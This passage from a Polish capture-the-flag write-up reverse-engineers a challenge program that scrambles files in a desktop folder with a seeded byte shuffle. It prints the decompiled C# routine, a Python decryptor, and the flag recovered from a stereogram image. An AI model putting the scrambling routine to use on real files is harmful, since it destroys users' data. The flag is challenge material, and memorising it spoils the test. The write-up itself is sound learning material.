</span></span><span style=display:flex><span>        C3554254475.C3904355907 c3904355907 = <span style=color:#66d9ef>new</span> C3554254475.C3904355907(<span style=color:#e6db74>&#34;blekota&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>foreach</span> (<span style=color:#66d9ef>string</span> str <span style=color:#66d9ef>in</span> (IEnumerable&lt;<span style=color:#66d9ef>string</span>&gt;) orderedEnumerable)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          c3904355907.C1908338681(str);
</span></span><span style=display:flex><span>          c3904355907.C3904355907(str);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>catch</span> (DirectoryNotFoundException ex)
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> num2 = (<span style=color:#66d9ef>int</span>) MessageBox.Show(<span style=color:#e6db74>&#34;Directory:&#34;</span> + path + <span style=color:#e6db74>&#34; doesn&#39;t exist&#34;</span>);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>catch</span> (Exception ex)
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> num2 = (<span style=color:#66d9ef>int</span>) MessageBox.Show(ex.Message);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>int</span> num3 = (<span style=color:#66d9ef>int</span>) MessageBox.Show(<span style=color:#e6db74>&#34;Done&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> (<span style=color:#66d9ef>true</span>)
</span></span><span style=display:flex><span>        Thread.Sleep(<span style=color:#ae81ff>10000</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span></code></pre></div><p>Zadaniem metody <code>C3554254475()</code> jest pozyskanie ścieżki do katalogu <code>tajne</code> umieszczonego na pulpicie użytkownika. Następnie dla plików umieszczonych w tym folderze wykonywane są dwie metody. Druga, krótsza <code>c3904355907.C3904355907()</code> odznacza tylko pliki jako zaszyfrowane/zakodowane natomiast <code>c3904355907.C1908338681();</code> skrywa logikę operacji na pliku.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>bool</span> C1908338681([In] <span style=color:#66d9ef>string</span> obj0)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      FileStream fileStream = (FileStream) <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>      BinaryReader binaryReader = (BinaryReader) <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>      BinaryWriter binaryWriter = (BinaryWriter) <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>bool</span> flag = <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>try</span>
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        Console.WriteLine(<span style=color:#e6db74>&#34;Processing file:&#34;</span> + obj0);
</span></span><span style=display:flex><span>        fileStream = File.Open(obj0, FileMode.OpenOrCreate, FileAccess.ReadWrite);
</span></span><span style=display:flex><span>        binaryReader = <span style=color:#66d9ef>new</span> BinaryReader((Stream) fileStream);
</span></span><span style=display:flex><span>        binaryWriter = <span style=color:#66d9ef>new</span> BinaryWriter((Stream) fileStream);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>byte</span>[] array = <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span>[<span style=color:#ae81ff>65536</span>];
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> newSize;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> ((newSize = binaryReader.Read(array, <span style=color:#ae81ff>0</span>, array.Length)) &gt; <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>        {
</span></span><span style=display:flex><span>          Console.WriteLine(<span style=color:#e6db74>&#34;read bytes:&#34;</span> + newSize.ToString());
</span></span><span style=display:flex><span>          Array.Resize&lt;<span style=color:#66d9ef>byte</span>&gt;(<span style=color:#66d9ef>ref</span> array, newSize);
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>byte</span>[] buffer = <span style=color:#66d9ef>this</span>.C3554254475(array);
</span></span><span style=display:flex><span>          binaryWriter.Seek(-newSize, SeekOrigin.Current);
</span></span><span style=display:flex><span>          binaryWriter.Write(buffer);
</span></span><span style=display:flex><span>          Console.WriteLine(<span style=color:#e6db74>&#34;write bytes:&#34;</span> + buffer.Length.ToString());
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>catch</span> (Exception ex)
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        flag = <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>finally</span>
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        binaryWriter.Dispose();
</span></span><span style=display:flex><span>        binaryReader.Dispose();
</span></span><span style=display:flex><span>        fileStream.Dispose();
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> flag;
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>Program odczytuje zawartość pliku wejściowego i następnie z wykorzystaniem funkcji <code>this.C3554254475(array)</code> dokonuje przestawienia bajtów w sposób następujący.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>byte</span>[] C3554254475([In] <span style=color:#66d9ef>byte</span>[] obj0)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (obj0.Length &gt; <span style=color:#ae81ff>65536</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> ArgumentException(<span style=color:#e6db74>&#34;data len too long&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>int</span> length = obj0.Length;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>int</span> num = length;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>byte</span>[] numArray = <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>byte</span>[length];
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>for</span> (; num &gt; <span style=color:#ae81ff>0</span>; --num)
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> index = (<span style=color:#66d9ef>int</span>) <span style=color:#66d9ef>this</span>.C3554254475[length - num] % num;
</span></span><span style=display:flex><span>        numArray[length - num] = obj0[index];
</span></span><span style=display:flex><span>        obj0[index] = obj0[num - <span style=color:#ae81ff>1</span>];
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> numArray;
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>Dla każdej paczki (chunk) danych o wielkości nie większej niż 65536 bajtów wykonywane są przestawienia bajtów zgodnie z kolejnością przedstawioną w pętli <code>for</code>. Operacja przesunięć bajtów (shuffle) wykorzystuje pole klasy <code>this.C3554254475</code>, które jest tablicą danych typu <code>ushort</code>, zdefiniowane następująco &ldquo;private readonly ushort[] C3554254475&rdquo;. Tablica ta wyliczana jest na podstawie ziarna, podanego jako parametr konstruktora <code>C3554254475.C3904355907 c3904355907 = new C3554254475.C3904355907("blekota");</code>. Słowo <em>blekota</em> inicjalizuje proces generowania tablicy przesunięć zaimplementowany następująco:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=display:flex><span> <span style=color:#66d9ef>public</span> C3904355907([In] <span style=color:#66d9ef>string</span> obj0)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>this</span>.C3554254475 = <span style=color:#66d9ef>this</span>.C3554254475(obj0);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.C3554254475.Length != <span style=color:#ae81ff>65536</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> ArgumentException(<span style=color:#e6db74>&#34;invalid len of randStream&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>ushort</span>[] C3554254475([In] <span style=color:#66d9ef>string</span> obj0_1)
</span></span><span style=display:flex><span>    {
</span></span><span style=display:flex><span>      List&lt;<span style=color:#66d9ef>ushort</span>&gt; ushortList = <span style=color:#66d9ef>new</span> List&lt;<span style=color:#66d9ef>ushort</span>&gt;(<span style=color:#ae81ff>65536</span>);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>byte</span>[] buffer = Encoding.ASCII.GetBytes(obj0_1);
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> (ushortList.Count &lt; <span style=color:#ae81ff>65536</span>)
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        buffer = <span style=color:#66d9ef>new</span> SHA512Managed().ComputeHash(buffer);
</span></span><span style=display:flex><span>        ushortList.AddRange((IEnumerable&lt;<span style=color:#66d9ef>ushort</span>&gt;) ((IEnumerable&lt;<span style=color:#66d9ef>byte</span>&gt;) buffer).C3554254475&lt;<span style=color:#66d9ef>byte</span>&gt;().Select&lt;Tuple&lt;<span style=color:#66d9ef>byte</span>, <span style=color:#66d9ef>byte</span>&gt;, <span style=color:#66d9ef>ushort</span>&gt;((Func&lt;Tuple&lt;<span style=color:#66d9ef>byte</span>, <span style=color:#66d9ef>byte</span>&gt;, <span style=color:#66d9ef>ushort</span>&gt;) (obj0_2 =&gt; (<span style=color:#66d9ef>ushort</span>) ((<span style=color:#66d9ef>uint</span>) obj0_2.Item1 * <span style=color:#ae81ff>256</span>U + (<span style=color:#66d9ef>uint</span>) obj0_2.Item2))).ToList&lt;<span style=color:#66d9ef>ushort</span>&gt;());
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> ushortList.ToArray();
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>Należy zwrócić uwagę na funkcję <code>C3554254475</code>, która zawiera całą trudność zadania. Z wejściowego ciągu <em>blekota</em> iteracyjnie tworzona jest lista liczb zbudowanych na podstawie hasha sha512. Proces ten można zobrazować czytelniej przy pomocy równorzędnego kodu w Pythonie.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>calc_touple</span>(t):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (t[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>256</span> <span style=color:#f92672>+</span> t[<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>chunk</span>(l, size<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>):
</span></span><span style=display:flex><span>    it <span style=color:#f92672>=</span> iter(l)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> iter(<span style=color:#66d9ef>lambda</span>: tuple(islice(it, size)), ())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_seed</span>(a):  <span style=color:#75715e>#should be blekota</span>
</span></span><span style=display:flex><span>    l <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    arr <span style=color:#f92672>=</span> a<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> len(l) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>65536</span>:
</span></span><span style=display:flex><span>        arr <span style=color:#f92672>=</span> util<span style=color:#f92672>.</span>hashes<span style=color:#f92672>.</span>sha512sum(arr)
</span></span><span style=display:flex><span>        c <span style=color:#f92672>=</span> chunk(arr)
</span></span><span style=display:flex><span>        l <span style=color:#f92672>+=</span> list(map(calc_touple, c))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> l
</span></span></code></pre></div><p>Myślę, że tak przedstawiony kod jest na tyle prosty, że nie wymaga dalszych wyjaśnień. W efekcie jego działania otrzymujemy tablicę stałych, które wykorzystywane są w procesie mieszania bajtów. Aby ułatwić sobie zrozumienie kodowania wejściowego pliku z przepisem na groszek przepisałem kod do Pythona. Poniższa funkcja jest równoważna metodzie <code>private byte[] C3554254475([In] byte[] obj0)</code> przedstaiwonej wyżej.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt</span>(chunk, lookup):
</span></span><span style=display:flex><span>    num <span style=color:#f92672>=</span> len(chunk)
</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> num
</span></span><span style=display:flex><span>    outchunk <span style=color:#f92672>=</span> bytearray(num)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> i <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        num2 <span style=color:#f92672>=</span> lookup[num <span style=color:#f92672>-</span> i] <span style=color:#f92672>%</span> i <span style=color:#75715e># znajduje wartosc w tablicy shuffli</span>
</span></span><span style=display:flex><span>        outchunk[num <span style=color:#f92672>-</span> i] <span style=color:#f92672>=</span> chunk[num2] <span style=color:#75715e># nowa wartosc w num - itym polu arraya to plik[num2]</span>
</span></span><span style=display:flex><span>        chunk[num2] <span style=color:#f92672>=</span> chunk[i <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#75715e># w pliku oryginalnym podmieniam wartość num2 na i - 1 z tego pliku </span>
</span></span><span style=display:flex><span>        i <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> outchunk
</span></span></code></pre></div><p>Umieściłem komentarze, które ułatwią odwrócenie procesu. Należy zwrócić uwagę na kolejność wykonywania działań, w innym przypadku skrypt dekodujący zwróci niepoprawny plik. Funkcja dekodująca została zaprezentowana poniżej:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(outchunk, lookup):
</span></span><span style=display:flex><span>    num <span style=color:#f92672>=</span> len(outchunk)
</span></span><span style=display:flex><span>    chunk <span style=color:#f92672>=</span> bytearray(len(outchunk))
</span></span><span style=display:flex><span>    outchunk <span style=color:#f92672>=</span> bytearray(outchunk)
</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> i <span style=color:#f92672>&lt;=</span> num:
</span></span><span style=display:flex><span>        num2 <span style=color:#f92672>=</span> lookup[num <span style=color:#f92672>-</span> i] <span style=color:#f92672>%</span> i
</span></span><span style=display:flex><span>        chunk[i <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> chunk[num2]
</span></span><span style=display:flex><span>        chunk[num2] <span style=color:#f92672>=</span> outchunk[num <span style=color:#f92672>-</span> i]
</span></span><span style=display:flex><span>        i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> chunk
</span></span></code></pre></div><p>Nie jest to skomplikowane. Teraz wystarczy wczytać plik <code>przepis</code> dostarczony w archiwum zip zadania. Aby uprościć sobie debugowanie napisałem prosty skrypt, który dekoduje przepis oraz sprawdza czy proces odkodowania przebiegł pomyślnie. Po kilku próbach dostosowania parametrów wykonanie sovlera przyniosło plik wyjściowy w postaci poprawnego pliku png.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#! /usr/bin/env python3</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> util
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> itertools <span style=color:#f92672>import</span> islice
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> io <span style=color:#f92672>import</span> BytesIO
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> PIL <span style=color:#f92672>import</span> Image
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>calc_touple</span>(t):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> (t[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>256</span> <span style=color:#f92672>+</span> t[<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xffff</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>chunk</span>(l, size<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>):
</span></span><span style=display:flex><span>    it <span style=color:#f92672>=</span> iter(l)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> iter(<span style=color:#66d9ef>lambda</span>: tuple(islice(it, size)), ())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_seed</span>(a):  <span style=color:#75715e>#should be blekota</span>
</span></span><span style=display:flex><span>    l <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    arr <span style=color:#f92672>=</span> a<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> len(l) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>65536</span>:
</span></span><span style=display:flex><span>        arr <span style=color:#f92672>=</span> util<span style=color:#f92672>.</span>hashes<span style=color:#f92672>.</span>sha512sum(arr)
</span></span><span style=display:flex><span>        c <span style=color:#f92672>=</span> chunk(arr)
</span></span><span style=display:flex><span>        l <span style=color:#f92672>+=</span> list(map(calc_touple, c))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> l
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encrypt</span>(chunk, lookup):
</span></span><span style=display:flex><span>    num <span style=color:#f92672>=</span> len(chunk)
</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> num
</span></span><span style=display:flex><span>    outchunk <span style=color:#f92672>=</span> bytearray(num)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> i <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        num2 <span style=color:#f92672>=</span> lookup[num <span style=color:#f92672>-</span> i] <span style=color:#f92672>%</span> i <span style=color:#75715e># znajduje wartosc w tablicy shuffli</span>
</span></span><span style=display:flex><span>        outchunk[num <span style=color:#f92672>-</span> i] <span style=color:#f92672>=</span> chunk[num2] <span style=color:#75715e># nowa wartosc w num - itym polu arraya to plik[num2]</span>
</span></span><span style=display:flex><span>        chunk[num2] <span style=color:#f92672>=</span> chunk[i <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#75715e># w pliku oryginalnym podmieniam wartość num2 na i - 1 z tego pliku </span>
</span></span><span style=display:flex><span>        i <span style=color:#f92672>-=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> outchunk
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decrypt</span>(outchunk, lookup):
</span></span><span style=display:flex><span>    num <span style=color:#f92672>=</span> len(outchunk)
</span></span><span style=display:flex><span>    chunk <span style=color:#f92672>=</span> bytearray(len(outchunk))
</span></span><span style=display:flex><span>    outchunk <span style=color:#f92672>=</span> bytearray(outchunk)
</span></span><span style=display:flex><span>    i <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> i <span style=color:#f92672>&lt;=</span> num:
</span></span><span style=display:flex><span>        num2 <span style=color:#f92672>=</span> lookup[num <span style=color:#f92672>-</span> i] <span style=color:#f92672>%</span> i
</span></span><span style=display:flex><span>        chunk[i <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> chunk[num2]
</span></span><span style=display:flex><span>        chunk[num2] <span style=color:#f92672>=</span> outchunk[num <span style=color:#f92672>-</span> i]
</span></span><span style=display:flex><span>        i <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> chunk
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>decryption</span>(fname, d):
</span></span><span style=display:flex><span>    parts <span style=color:#f92672>=</span> bytearray(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>with</span> open(fname, <span style=color:#e6db74>&#39;rb&#39;</span>) <span style=color:#66d9ef>as</span> f:
</span></span><span style=display:flex><span>        chunk <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>65536</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> chunk:
</span></span><span style=display:flex><span>            print(len(chunk))
</span></span><span style=display:flex><span>            parts<span style=color:#f92672>.</span>extend(decrypt(chunk, d[:]))
</span></span><span style=display:flex><span>            chunk <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>65536</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    open(<span style=color:#e6db74>&#39;przepis_plaint.png&#39;</span>, <span style=color:#e6db74>&#39;w+b&#39;</span>)<span style=color:#f92672>.</span>write(parts)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> parts
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>encryption</span>(bts, d):
</span></span><span style=display:flex><span>    chunks <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    parts <span style=color:#f92672>=</span> bytearray(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(bts), <span style=color:#ae81ff>65536</span>):
</span></span><span style=display:flex><span>        chunks<span style=color:#f92672>.</span>append(bts[i: i <span style=color:#f92672>+</span> <span style=color:#ae81ff>65536</span>])
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> chunks:
</span></span><span style=display:flex><span>        parts<span style=color:#f92672>.</span>extend(encrypt(c, d))
</span></span><span style=display:flex><span>        print(len(c))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    open(<span style=color:#e6db74>&#39;plaint2&#39;</span>, <span style=color:#e6db74>&#39;w+b&#39;</span>)<span style=color:#f92672>.</span>write(parts)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> parts
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    seed <span style=color:#f92672>=</span> get_seed(<span style=color:#e6db74>&#39;blekota&#39;</span>)
</span></span><span style=display:flex><span>    parts <span style=color:#f92672>=</span> decryption(<span style=color:#e6db74>&#39;./przepis&#39;</span>, seed)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;############&#39;</span>)
</span></span><span style=display:flex><span>    parts2 <span style=color:#f92672>=</span> encryption(parts, seed)
</span></span><span style=display:flex><span>    parts3 <span style=color:#f92672>=</span> bytearray(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>    parts3<span style=color:#f92672>.</span>extend(open(<span style=color:#e6db74>&#39;./przepis&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>)<span style=color:#f92672>.</span>read())
</span></span><span style=display:flex><span>    diff <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i, j <span style=color:#f92672>in</span> zip(parts2, parts3):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> int(i) <span style=color:#f92672>!=</span> int(j):
</span></span><span style=display:flex><span>            diff <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    print(diff)
</span></span><span style=display:flex><span>    print(diff<span style=color:#f92672>/</span>len(parts2))
</span></span></code></pre></div><p>Wyjściowa grafika prezentuje się tak:</p><p><img src=./przepis_plaint.png alt=Obrazek></p><h2 id=stegangorafia>Stegangorafia?<a href=#stegangorafia class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Otrzymany w wyniku zdekodowania plik przedstawiał&mldr; no właśnie co przedstawiał? Regularne kształty roślin sugerują, że przedstawiony obrazek przechowuje dodatkowe informacje. Jednak ani wpatrywanie się weń, ani wyodrębnienie EXIFów nie przyniosło porządanych wyników. Nie jestem zwolennikiem steganografii w zadaniach typu CTF, bowiem gracz szuka czegoś w czymś i jedyny sposób rozwiązania takich wyzwań to po prostu odgadnięcie metody wykorzystanej do ukrycia tego &ldquo;czegoś&rdquo; w tym &ldquo;czymś&rdquo;. Na szczęście są narzędzia, które automatyzują i testują wiele popularnych sztuczek. Oszczędzają w ten sposób wiele czasu. W czasie gdy obrazek przechodził testy <code>stegoveritas</code> oraz <code>stego-toolkit</code> postanowiłem wrzucić go w Google Image Search i wykorzystując wyszukiwanie obrazem trafiłem na <a href=https://www.reddit.com/r/funny/comments/6okhyc/a_hidden_message_in_nature/>poniższy</a> wątek w portalu reddit.</p><p>Okazuje się, że taka grafika została wykorzystana do ukrycia informacji z wykorzystaniem zupełnie innych metod niż te, które rozpatrywałem. Odkrycie pozwoliło na pominięcie wątku steganografii i skupienie się na wyodrębnieniu wiadomości. Fraza, którą określono obrazek na reddicie to <em>magic eye image</em>. Okazuje się, że istnieje <a href=https://magiceye.ecksdee.co.uk/>narzędzie</a>, które próbuje znanych metod pozyskania wiadomości.</p><p>Przepis na gorszek prezentuje się nastepująco:</p><p><img src=./przepis_na_gorszek.png alt=Przepis></p><p>Podobny efekt można osiągnąć wykorzystując program graficzny Gimp, przesuwając warstwy obrazu.</p><h2 id=podsumowanie>Podsumowanie<a href=#podsumowanie class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Flaga to <strong>FLG{potas, pieprz, lukrecja}</strong>, co brzmi jak całkiem sensowny pomysł na przepyszną potrawę ;)</p><p>Zadanie udało mi się ukończuć w stosunkowo krótkim czasie, bez dostępnych podpowiedzi, jednak było całkiem przemyślane i dużo lepsze od poprzednich. Jak pisałem wyżej, na razie odpuszczę sobie kolejne wyzwania do momentu skoku ich trudności. Czterokrotne podium mnie zadowala. Serdecznie dziękuję za zabawę :)</p><p>foxtrot_charlie over and out!</p></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>copyright by foxtrot_charlie</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://foxtrotlabs.cc/assets/main.js></script><script src=https://foxtrotlabs.cc/assets/prism.js></script></div></body></html>